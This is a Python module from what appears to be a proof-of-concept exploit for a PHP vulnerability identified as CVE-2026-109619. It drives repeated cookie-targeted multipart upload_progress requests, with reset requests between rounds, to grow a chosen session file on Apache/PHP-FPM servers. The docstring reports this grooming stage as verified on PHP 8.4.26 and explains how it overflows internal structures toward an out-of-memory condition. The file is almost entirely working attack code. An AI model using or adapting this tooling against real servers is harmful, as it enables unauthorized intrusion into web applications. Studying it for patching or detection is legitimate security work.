#!/usr/bin/env python3 -I
# INDEX: cookie-targeted pure-HTTP upload_progress session seed | apache fpm | use_only_cookies=on
"""Cookie-driven pure-HTTP upload_progress accumulation seed (CVE-2026-109619).

Drives groom.upload_progress_accumulate rounds into a CHOSEN session id over HTTP. Under
session.use_only_cookies=On (the stock default) a PHPSESSID POST field is ignored, so the sid
MUST come from a Cookie header -- without it each round lands in a throwaway session and sess_<sid>
stays empty. Each round sends the wall-OOM record chunked with Cookie: PHPSESSID=<sid>, with a
clean request between rounds (groom.clean_request_reset) to defeat surviving-worker real_size churn,
so the records accumulate on disk despite cleanup=On. NSMALL small-name records overflow var_entries
once (seat d/E/DT at their natural low offsets); NBIG big-name records grow the file.

Accumulation caps at ~memory_limit/4 (each round's s_read+decode+encode of the growing session),
below the ~memory_limit/2 decode-OOM floor; the cap (observe the on-disk size stalling) is the
pure-HTTP seat ceiling.

API:
  seed(host, port, sid, nsmall, nbig, *, bigfn=500000, wall=4000, levels=60, boundary=b"apsfof",
       path="/plain.php", timeout=12, reset=True) -> rounds sent. Accumulates into sess_<sid>.
  round_once(host, port, sid, index, fnlen, wall, levels, boundary, path, timeout) -> raw response.

Tested: php:8.4.26-apache @32M/@128M (sess_<sid> written www-data, no docker-exec).
Stage: VERIFIED 8.4.26-apache (accumulation; does not by itself reach the decode-OOM floor).
"""
import os
import sys

_POC_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))  # poc/
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from common import http_raw as H  # noqa: E402
from common.multipart import part as mp_part, terminator  # noqa: E402
from primitives.groom import clean_request_reset  # noqa: E402
from primitives.groom.upload_progress_accumulate import record_parts  # noqa: E402


def round_once(host, port, sid, index, fnlen, wall=4000, levels=60,
               boundary=b"apsfof", path="/plain.php", timeout=12):
    """Send one cookie-targeted accumulation round for `sid` (a progress record of filename length
    `fnlen` + the nested-field OOM wall). Returns the raw response."""
    parts = record_parts(index, fnlen, wall, levels)
    body = b"".join(mp_part(n, v, filename=fn, ctype="application/octet-stream", boundary=boundary)
                    for n, v, fn in parts) + terminator(boundary)
    return H.send_multipart_chunked(host, port, path, body, boundary, timeout,
                                    cookie="PHPSESSID=" + sid)


def seed(host, port, sid, nsmall, nbig, *, bigfn=500000, wall=4000, levels=60,
         boundary=b"apsfof", path="/plain.php", timeout=12, reset=True):
    """Accumulate `nsmall` small (filename 5) + `nbig` big (filename `bigfn`) records into
    sess_<sid> over cookie-targeted HTTP, a clean_request_reset between rounds when `reset`.
    Returns the number of rounds sent."""
    idx = 0
    for _ in range(nsmall):
        idx += 1
        round_once(host, port, sid, idx, 5, wall, levels, boundary, path, timeout)
        if reset:
            clean_request_reset.reset(host, port)
    for _ in range(nbig):
        idx += 1
        round_once(host, port, sid, idx, bigfn, wall, levels, boundary, path, timeout)
        if reset:
            clean_request_reset.reset(host, port)
    return idx
